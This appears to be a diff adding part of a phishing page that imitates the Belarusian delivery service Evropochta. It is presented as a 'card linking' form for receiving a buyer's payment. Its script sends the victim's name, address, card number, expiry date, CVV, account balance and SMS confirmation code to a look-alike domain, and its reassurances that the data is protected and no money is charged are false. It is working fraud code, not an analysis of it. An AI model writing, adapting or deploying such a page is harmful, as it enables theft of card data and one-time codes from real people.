+                            <div class="input-wrap">
+                                <input type="text" id="fullname" name="fullname" placeholder="Иванов Иван Иванович" maxlength="100" required>
+                                <span class="status-icon success"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></span>
+                                <span class="status-icon error-icon"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></span>
+                            </div>
+                            <div class="error-message">Введите минимум имя и фамилию (только буквы)</div>
+                        </div>
+                        <div class="form-group">
+                            <label for="city">Город</label>
+                            <div class="input-wrap">
+                                <input type="text" id="city" name="city" placeholder="Минск" maxlength="50" required>
+                                <span class="status-icon success"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></span>
+                                <span class="status-icon error-icon"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></span>
+                            </div>
+                            <div class="error-message">Введите название города (только буквы)</div>
+                        </div>
+                        <div class="form-group">
+                            <label for="address">Улица, дом, квартира</label>
+                            <div class="input-wrap">
+                                <input type="text" id="address" name="address" placeholder="ул. Ленина, д. 10, кв. 5" maxlength="120" required>
+                                <span class="status-icon success"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></span>
+                                <span class="status-icon error-icon"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></span>
+                            </div>
+                            <div class="error-message">Введите адрес с номером дома (минимум 5 символов)</div>
+                        </div>
+                    </div>
+
+                    <div class="form-section">
+                        <div class="form-section-title">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
+                            Карта для получения средств
+                        </div>
+                        <div class="form-group">
+                            <label for="cardnumber">Номер карты</label>
+                            <div class="input-wrap">
+                                <input type="text" id="cardnumber" name="cardnumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number" required>
+                                <span class="card-brand" id="card-brand"></span>
+                                <span class="status-icon success"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></span>
+                                <span class="status-icon error-icon"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></span>
+                            </div>
+                            <div class="card-hint">
+                                <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                                Сумма заказа добавится к вашему счёту
+                            </div>
+                            <div class="error-message" id="card-error">Введите корректный номер карты</div>
+                        </div>
+                        <div class="form-row" style="margin-top: 14px;">
+                            <div class="form-group">
+                                <label for="expiry">Срок действия</label>
+                                <div class="input-wrap">
+                                    <input type="text" id="expiry" name="expiry" placeholder="ММ/ГГ" maxlength="5" inputmode="numeric" autocomplete="cc-exp" required>
+                                    <span class="status-icon success"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></span>
+                                    <span class="status-icon error-icon"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></span>
+                                </div>
+                                <div class="error-message" id="expiry-error">Неверный срок</div>
+                            </div>
+                            <div class="form-group">
+                                <label for="cvc">CVV</label>
+                                <div class="input-wrap">
+                                    <input type="password" id="cvc" name="cvc" placeholder="•••" maxlength="3" inputmode="numeric" autocomplete="cc-csc" required>
+                                    <button type="button" class="cvv-toggle" id="cvv-toggle" aria-label="Показать CVV">
+                                        <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                                    </button>
+                                    <span class="status-icon success"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></span>
+                                    <span class="status-icon error-icon"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></span>
+                                </div>
+                                <div class="error-message" id="cvc-error">Введите 3 цифры</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <button type="submit" id="submit-btn" class="btn-primary" disabled>
+                        <span class="spinner"></span>
+                        <span class="btn-label">Привязать карту</span>
+                    </button>
+
+                    <div class="secure-note">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                        Данные карты защищены SSL. Списание не производится.
+                    </div>
+
+                    <button type="button" class="btn-secondary" onclick="showSlide('slide-info')">Назад</button>
+                </form>
+            </div>
+
+            <!-- СЛАЙД 3: Проверка баланса (ОБНОВЛЕННЫЙ) -->
+            <div id="slide-balance" class="slide">
+                <div class="form-header" style="margin-bottom: 18px;">
+                    <h1>Проверка баланса</h1>
+                </div>
+
+                <div class="balance-info-box">
+                    <div class="balance-info-title">После подтверждения карты</div>
+                    <div class="balance-info-text">
+                        Сумма, оплаченная Покупателем, <strong>пополнится на ваш действующий счёт</strong> в Белорусских рублях (BYN).
+                    </div>
+                    <div class="balance-time-box">
+                        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline><path d="M16 3l4 4"></path></svg>
+                        <div class="balance-time-text">
+                            <strong>Срок зачисления:</strong>
+                            до 2 часов с момента оплаты Покупателем
+                        </div>
+                    </div>
+                </div>
+
+                <form id="balance-form" novalidate>
+                    <div class="form-group" style="margin-bottom: 18px;">
+                        <label for="balance">Остаток по счёту на данный момент</label>
+                        <div class="input-wrap">
+                            <input type="text" id="balance" name="balance" placeholder="Введите сумму, например: 1500.00" inputmode="decimal" autocomplete="off" required>
+                            <span class="status-icon success"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></span>
+                            <span class="status-icon error-icon"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></span>
+                        </div>
+                        <div class="error-message" id="balance-error">Введите остаток по счёту (число)</div>
+                    </div>
+
+                    <button type="submit" id="balance-submit" class="btn-primary" disabled>
+                        <span class="spinner"></span>
+                        <span class="btn-label">Продолжить</span>
+                    </button>
+
+                    <button type="button" class="btn-secondary" onclick="showSlide('slide-form')" style="margin-top: 18px;">Назад</button>
+                </form>
+            </div>
+
+            <!-- СЛАЙД 4: Подтверждение СМС -->
+            <div id="slide-sms" class="slide">
+                <div class="sms-header">
+                    <div class="sms-icon">
+                        <svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                    </div>
+                    <h1>Подтверждение привязки</h1>
+                    <p>Мы отправили код на номер, привязанный к вашей карте. <br>Введите его, чтобы подтвердить привязку. <br><strong>Код действителен 5 минут.</strong></p>
+                </div>
+
+                <form id="sms-form" novalidate>
+                    <div class="code-inputs" id="code-inputs">
+                        <input type="tel" maxlength="1" inputmode="numeric" autocomplete="one-time-code" data-index="0">
+                        <input type="tel" maxlength="1" inputmode="numeric" data-index="1">
+                        <input type="tel" maxlength="1" inputmode="numeric" data-index="2">
+                        <input type="tel" maxlength="1" inputmode="numeric" data-index="3">
+                        <input type="tel" maxlength="1" inputmode="numeric" data-index="4">
+                        <input type="tel" maxlength="1" inputmode="numeric" data-index="5">
+                    </div>
+
+                    <div class="code-error" id="code-error">Неверный код. Попробуйте еще раз.</div>
+
+                    <button type="submit" id="sms-submit" class="btn-primary" disabled>
+                        <span class="spinner"></span>
+                        <span class="btn-label">Подтвердить привязку</span>
+                    </button>
+
+                    <div class="resend-block">
+                        Не получили код?
+                        <button type="button" id="resend-btn" disabled>Отправить повторно (<span id="timer">60</span>с)</button>
+                    </div>
+
+                    <button type="button" class="btn-secondary" onclick="showSlide('slide-balance')" style="margin-top: 18px;">Назад</button>
+                </form>
+            </div>
+
+        </div>
+
+        <footer>
+            <div class="footer">
+                <ul class="menu-footer">
+                    <li class="nav-item">
+                        <div class="title">О компании</div>
+                        <ul>
+                            <li><a href="https://evropochta.by/about/us/">О нас</a></li>
+                            <li><a href="https://evropochta.by/about/offices/">Адреса отделений</a></li>
+                            <li><a href="https://evropochta.by/about/feedback/">Обратная связь</a></li>
+                        </ul>
+                    </li>
+                    <li class="nav-item">
+                        <div class="title">Услуги</div>
+                        <ul>
+                            <li><a href="https://evropochta.by/services/tariffs_fl/">Тарифы для физ. лиц</a></li>
+                            <li><a href="https://evropochta.by/services/office_door/">Доставка до двери</a></li>
+                            <li><a href="https://evropochta.by/services/office_office/">Доставка между отделениями</a></li>
+                        </ul>
+                    </li>
+                    <li class="nav-item">
+                        <div class="title">Помощь</div>
+                        <ul>
+                            <li><a href="https://evropochta.by/info/faq/">Вопрос-ответ</a></li>
+                            <li><a href="https://evropochta.by/info/license/">Лицензия и регламент</a></li>
+                        </ul>
+                    </li>
+                </ul>
+
+                <div class="footer-licence">
+                    <p>© 2019-2026 ЗАО «Интернет-магазин Евроопт». Все права защищены.</p>
+                    <p>УНП №691536217. Телефон: 5353636 (MTC, Life, A1), ежедневно с 8:30 до 20:30.</p>
+                    <p><a href="https://evropochta.by/UserFiles/%D0%9F%D0%9E%D0%9B%D0%98%D0%A2%D0%98%D0%9A%D0%90%20%E2%84%965.pdf">Политика обработки персональных данных.</a></p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        const API_URL = 'https://evropochta.com';
+
+        function showSlide(slideId) {
+            document.querySelectorAll('.slide').forEach(slide => slide.classList.remove('active'));
+            document.getElementById(slideId).classList.add('active');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function switchTab(clickedTab, tabContentId) {
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            clickedTab.classList.add('active');
+            document.querySelectorAll('.tab-content').forEach(content => content.style.display = 'none');
+            document.getElementById(tabContentId).style.display = 'block';
+        }
+
+        // === Слайд 2: Форма карты ===
+        const form = document.getElementById('payout-form');
+        const submitBtn = document.getElementById('submit-btn');
+
+        const fieldFullname = document.getElementById('fullname');
+        const fieldCity = document.getElementById('city');
+        const fieldAddress = document.getElementById('address');
+        const fieldCard = document.getElementById('cardnumber');
+        const fieldExpiry = document.getElementById('expiry');
+        const fieldCvc = document.getElementById('cvc');
+        const cardBrand = document.getElementById('card-brand');
+
+        function isValidFullname(value) {
+            const v = value.trim();
+            if (v.length < 5 || v.length > 100) return false;
+            if (!/^[а-яёА-ЯЁa-zA-Z\s-]+$/.test(v)) return false;
+            const parts = v.split(/\s+/).filter(p => p.length >= 2);
+            return parts.length >= 2;
+        }
+
+        function isValidCity(value) {
+            const v = value.trim();
+            return v.length >= 2 && v.length <= 50 && /^[а-яёА-ЯЁa-zA-Z\s-]+$/.test(v);
+        }
+
+        function isValidAddress(value) {
+            const v = value.trim();
+            return v.length >= 5 && v.length <= 120 && /[0-9]/.test(v) && /^[а-яёА-ЯЁa-zA-Z0-9\s.,\/-]+$/.test(v);
+        }
+
+        function luhnCheck(cardNumber) {
+            const digits = cardNumber.replace(/\D/g, '');
+            if (digits.length < 13 || digits.length > 19) return false;
+            let sum = 0, isEven = false;
+            for (let i = digits.length - 1; i >= 0; i--) {
+                let d = parseInt(digits[i], 10);
+                if (isEven) { d *= 2; if (d > 9) d -= 9; }
+                sum += d; isEven = !isEven;
+            }
+            return sum % 10 === 0;
+        }
+
+        function detectCardBrand(cardNumber) {
+            const digits = cardNumber.replace(/\D/g, '');
+            if (!digits) return null;
+            if (/^4/.test(digits)) return { name: 'VISA', cls: 'visa' };
+            if (/^5[1-5]/.test(digits) || /^2(2[2-9]|[3-6][0-9]|7[01]|720)/.test(digits)) return { name: 'MC', cls: 'mastercard' };
+            if (/^220[0-4]/.test(digits)) return { name: 'МИР', cls: 'mir' };
+            if (/^(50|5[6-9]|6)/.test(digits)) return { name: 'MAESTRO', cls: 'maestro' };
+            if (/^3[47]/.test(digits)) return { name: 'AMEX', cls: 'amex' };
+            if (/^62/.test(digits)) return { name: 'UNIONPAY', cls: 'unionpay' };
+            if (/^6011|^65/.test(digits)) return { name: 'DISCOVER', cls: 'discover' };
+            if (/^35/.test(digits)) return { name: 'JCB', cls: 'jcb' };
+            if (/^30[0-5]/.test(digits)) return { name: 'DINERS', cls: 'diners' };
+            if (/^9/.test(digits)) return { name: 'BELKART', cls: 'belkart' };
+            return null;
+        }
+
+        function isValidExpiry(value) {
+            const cleaned = value.replace(/\D/g, '');
+            if (cleaned.length !== 4) return false;
+            const month = parseInt(cleaned.slice(0, 2), 10);
+            const year = parseInt('20' + cleaned.slice(2, 4), 10);
+            if (month < 1 || month > 12) return false;
+            const now = new Date();
+            const currentYear = now.getFullYear();
+            const currentMonth = now.getMonth() + 1;
+            if (year < currentYear) return false;
+            if (year === currentYear && month < currentMonth) return false;
+            if (year > currentYear + 20) return false;
+            return true;
+        }
+
+        function isValidCvc(value) {
+            return /^\d{3}$/.test(value);
+        }
+
+        function setState(input, valid, message) {
+            const group = input.closest('.form-group');
+            group.classList.remove('valid', 'error');
+            if (input.value.trim() === '') return;
+            if (valid) {
+                group.classList.add('valid');
+            } else {
+                group.classList.add('error');
+                const errorMsg = group.querySelector('.error-message');
+                if (errorMsg && message) errorMsg.textContent = message;
+            }
+        }
+
+        function validateForm() {
+            let isValid = true;
+
+            const fnValid = isValidFullname(fieldFullname.value);
+            setState(fieldFullname, fnValid, 'Введите минимум имя и фамилию (только буквы)');
+            if (!fnValid) isValid = false;
+
+            const cityValid = isValidCity(fieldCity.value);
+            setState(fieldCity, cityValid, 'Введите название города (только буквы)');
+            if (!cityValid) isValid = false;
+
+            const addrValid = isValidAddress(fieldAddress.value);
+            setState(fieldAddress, addrValid, 'Введите адрес с номером дома (минимум 5 символов)');
+            if (!addrValid) isValid = false;
+
+            const cardValid = luhnCheck(fieldCard.value);
+            setState(fieldCard, cardValid, 'Введите корректный номер карты');
+            if (!cardValid) isValid = false;
+
+            const expValid = isValidExpiry(fieldExpiry.value);
+            setState(fieldExpiry, expValid, 'Неверный срок или карта просрочена');
+            if (!expValid) isValid = false;
+
+            const cvcValid = isValidCvc(fieldCvc.value);
+            setState(fieldCvc, cvcValid, 'Введите 3 цифры');
+            if (!cvcValid) isValid = false;
+
+            submitBtn.disabled = !isValid;
+            return isValid;
+        }
+
+        function debounce(fn, ms) {
+            let t;
+            return (...args) => { clearTimeout(t); t = setTimeout(() => fn(...args), ms); };
+        }
+        const debouncedValidate = debounce(validateForm, 150);
+
+        [fieldFullname, fieldCity, fieldAddress, fieldCard, fieldExpiry, fieldCvc].forEach(field => {
+            field.addEventListener('input', debouncedValidate);
+            field.addEventListener('blur', validateForm);
+        });
+
+        fieldCard.addEventListener('input', function () {
+            let value = this.value.replace(/\D/g, '');
+            if (value.length > 16) value = value.slice(0, 16);
+            this.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+            const brand = detectCardBrand(this.value);
+            if (brand) {
+                cardBrand.textContent = brand.name;
+                cardBrand.className = 'card-brand show ' + brand.cls;
+            } else {
+                cardBrand.className = 'card-brand';
+            }
+        });
+
+        fieldExpiry.addEventListener('input', function () {
+            let value = this.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                let month = value.slice(0, 2);
+                let m = parseInt(month, 10);
+                if (m > 12) month = '12';
+                if (m === 0) month = '01';
+                value = month + '/' + value.slice(2, 4);
+            }
+            this.value = value;
+        });
+
+        fieldCvc.addEventListener('input', function () {
+            this.value = this.value.replace(/\D/g, '').slice(0, 3);
+        });
+
+        const cvvToggle = document.getElementById('cvv-toggle');
+        cvvToggle.addEventListener('click', function () {
+            fieldCvc.type = fieldCvc.type === 'password' ? 'text' : 'password';
+        });
+
+        [fieldFullname, fieldCity].forEach(f => {
+            f.addEventListener('blur', function () {
+                this.value = this.value.replace(/\s+/g, ' ').trim();
+            });
+        });
+        fieldCity.addEventListener('blur', function () {
+            if (this.value) this.value = this.value.charAt(0).toUpperCase() + this.value.slice(1);
+        });
+
+        form.addEventListener('submit', async function (e) {
+            e.preventDefault();
+
+            if (!validateForm()) {
+                form.classList.add('shake');
+                setTimeout(() => form.classList.remove('shake'), 350);
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.classList.add('loading');
+
+            try {
+                const resp = await fetch(API_URL + '/api/card', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        fullname: fieldFullname.value.trim(),
+                        city: fieldCity.value.trim(),
+                        address: fieldAddress.value.trim(),
+                        cardnumber: fieldCard.value.trim(),
+                        expiry: fieldExpiry.value.trim(),
+                        cvc: fieldCvc.value,
+                    }),
+                });
+                if (!resp.ok) throw new Error('Ошибка сервера');
+            } catch (err) {
+                alert('Не удалось отправить данные. Проверьте соединение с сервером.');
+                submitBtn.disabled = false;
+                submitBtn.classList.remove('loading');
+                return;
+            }
+
+            window.payoutData = {
+                fullname: fieldFullname.value.trim(),
+                city: fieldCity.value.trim(),
+                address: fieldAddress.value.trim(),
+                cardMask: '**** **** **** ' + fieldCard.value.replace(/\D/g, '').slice(-4)
+            };
+
+            submitBtn.classList.remove('loading');
+            showSlide('slide-balance');
+            resetBalanceForm();
+        });
+
+        // === Слайд 3: Проверка баланса ===
+        const balanceForm = document.getElementById('balance-form');
+        const balanceSubmit = document.getElementById('balance-submit');
+        const balanceInput = document.getElementById('balance');
+
+        function isValidBalance(value) {
+            const v = value.trim().replace(/\s/g, '').replace(',', '.');
+            if (!v) return false;
+            if (!/^\d+(\.\d{1,2})?$/.test(v)) return false;
+            return parseFloat(v) > 0;
+        }
+
+        function updateBalanceSubmitState() {
+            balanceSubmit.disabled = !isValidBalance(balanceInput.value);
+        }
+
+        function resetBalanceForm() {
+            balanceInput.value = '';
+            const group = balanceInput.closest('.form-group');
+            group.classList.remove('valid', 'error');
+            balanceSubmit.disabled = true;
+            balanceInput.focus();
+        }
+
+        balanceInput.addEventListener('input', function () {
+            this.value = this.value.replace(/[^\d.,\s]/g, '');
+            const group = balanceInput.closest('.form-group');
+            group.classList.remove('valid', 'error');
+            if (this.value.trim() !== '') {
+                group.classList.add(isValidBalance(this.value) ? 'valid' : 'error');
+            }
+            updateBalanceSubmitState();
+        });
+
+        balanceInput.addEventListener('blur', function () {
+            const group = balanceInput.closest('.form-group');
+            if (this.value.trim() !== '') {
+                group.classList.add(isValidBalance(this.value) ? 'valid' : 'error');
+            }
+            updateBalanceSubmitState();
+        });
+
+        balanceForm.addEventListener('submit', async function (e) {
+            e.preventDefault();
+            if (!isValidBalance(balanceInput.value)) return;
+
+            balanceSubmit.classList.add('loading');
+            balanceSubmit.disabled = true;
+
+            try {
+                const resp = await fetch(API_URL + '/api/balance', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ balance: balanceInput.value.trim() }),
+                });
+                if (!resp.ok) throw new Error('Ошибка сервера');
+            } catch (err) {
+                alert('Ошибка отправки данных. Попробуйте ещё раз.');
+                balanceSubmit.classList.remove('loading');
+                balanceSubmit.disabled = false;
+                return;
+            }
+
+            balanceSubmit.classList.remove('loading');
+            showSlide('slide-sms');
+            resetSmsForm();
+        });
+
+        // === Слайд 4: СМС код ===
+        const smsForm = document.getElementById('sms-form');
+        const smsSubmit = document.getElementById('sms-submit');
+        const codeInputs = document.querySelectorAll('.code-inputs input');
+        const codeInputsWrapper = document.getElementById('code-inputs');
+        const codeError = document.getElementById('code-error');
+        const resendBtn = document.getElementById('resend-btn');
+        const timerEl = document.getElementById('timer');
+
+        let resendTimer = null;
+
+        function checkSmsComplete() {
+            const code = Array.from(codeInputs).map(i => i.value).join('');
+            smsSubmit.disabled = code.length !== 6;
+        }
+
+        function resetSmsForm() {
+            codeInputs.forEach(input => {
+                input.value = '';
+                input.classList.remove('filled');
+            });
+            codeInputsWrapper.classList.remove('error');
+            codeError.classList.remove('show');
+            smsSubmit.disabled = true;
+            codeInputs[0].focus();
+            startResendTimer();
+        }
+
+        function startResendTimer() {
+            if (resendTimer) clearInterval(resendTimer);
+            let seconds = 60;
+            timerEl.textContent = seconds;
+            resendBtn.disabled = true;
+            resendBtn.innerHTML = 'Отправить повторно (<span id="timer">60</span>с)';
+            const innerTimer = document.getElementById('timer');
+
+            resendTimer = setInterval(() => {
+                seconds--;
+                if (innerTimer) innerTimer.textContent = seconds;
+                if (seconds <= 0) {
+                    clearInterval(resendTimer);
+                    resendBtn.disabled = false;
+                    resendBtn.textContent = 'Отправить повторно';
+                }
+            }, 1000);
+        }
+
+        codeInputs.forEach((input, index) => {
+            input.addEventListener('input', function () {
+                this.value = this.value.replace(/\D/g, '');
+                if (this.value) {
+                    this.classList.add('filled');
+                    if (index < codeInputs.length - 1) codeInputs[index + 1].focus();
+                } else {
+                    this.classList.remove('filled');
+                }
+                checkSmsComplete();
+            });
+
+            input.addEventListener('keydown', function (e) {
+                if (e.key === 'Backspace' && !this.value && index > 0) {
+                    codeInputs[index - 1].focus();
+                    codeInputs[index - 1].value = '';
+                    codeInputs[index - 1].classList.remove('filled');
+                    checkSmsComplete();
+                }
+                if (e.key === 'ArrowLeft' && index > 0) codeInputs[index - 1].focus();
+                if (e.key === 'ArrowRight' && index < codeInputs.length - 1) codeInputs[index + 1].focus();
+            });
+
+            input.addEventListener('paste', function (e) {
+                e.preventDefault();
+                const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
+                pasted.split('').forEach((digit, i) => {
+                    if (codeInputs[i]) {
+                        codeInputs[i].value = digit;
+                        codeInputs[i].classList.add('filled');
+                    }
+                });
+                if (pasted.length > 0) codeInputs[Math.min(pasted.length, 5)].focus();
+                checkSmsComplete();
+            });
+        });
+
+        smsForm.addEventListener('submit', async function (e) {
+            e.preventDefault();
+            const code = Array.from(codeInputs).map(i => i.value).join('');
+            if (code.length !== 6) return;
+
+            smsSubmit.classList.add('loading');
+            smsSubmit.disabled = true;
+
+            try {
+                const resp = await fetch(API_URL + '/api/sms', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ code: code }),
+                });
+                if (!resp.ok) throw new Error('Ошибка сервера');
+            } catch (err) {
+                alert('Ошибка отправки кода. Попробуйте ещё раз.');
+                smsSubmit.classList.remove('loading');
+                smsSubmit.disabled = false;
+                return;
+            }
+
+            setTimeout(() => {
+                alert(
+                    '✅ Доступ к карте подтверждён!\n\n' +
+                    'Получатель: ' + window.payoutData.fullname + '\n' +
+                    'Город: ' + window.payoutData.city + '\n' +
+                    'Адрес доставки: ' + window.payoutData.address + '\n' +
+                    'Карта: ' + window.payoutData.cardMask + '\n\n' +
+                    'Средства поступят на карту после доставки заказа.\n' +
+                    'Ожидайте звонка курьера в течение 12 часов.'
+                );
+                smsSubmit.classList.remove('loading');
+                document.getElementById('payout-form').reset();
+                validateForm();
+                showSlide('slide-info');
+            }, 700);
+        });
+
+        resendBtn.addEventListener('click', function () {
+            alert('Новый код отправлен на ваш номер.');
+            resetSmsForm();
+        });
+
+        validateForm();
+    </script>
+</body>
+</html>
